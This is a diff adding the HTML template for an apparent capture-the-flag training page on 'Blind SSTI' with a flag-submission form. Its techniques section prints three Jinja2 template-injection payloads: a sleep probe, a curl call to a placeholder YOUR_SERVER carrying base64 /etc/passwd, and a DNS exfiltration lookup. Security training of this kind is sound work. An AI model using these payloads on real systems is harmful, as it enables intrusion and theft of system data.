@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>🧪 Blind SSTI</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
+    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Output isn't reflected. Use time-based detection (sleep) or out-of-band callbacks to confirm and exploit SSTI blindly.</p></div>
+    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Techniques</h2>
+      <div class="code-block">Time-based detection:
+{{''.__class__.__mro__[2].__subclasses__()[40].__init__.__globals__['os'].popen('sleep 5').read()}}
+
+OOB (Out-of-Band):
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR_SERVER/?flag=$(cat /etc/passwd | base64)').read()}}
+
+DNS exfiltration:
+{{''.__class__.__init__.__globals__['os'].popen('nslookup $(whoami).YOUR_SERVER').read()}}</div>
+    </div>
+    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('ssti-basic','flagInput_ssti3','flagResult_ssti3'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_ssti3" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_ssti3" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
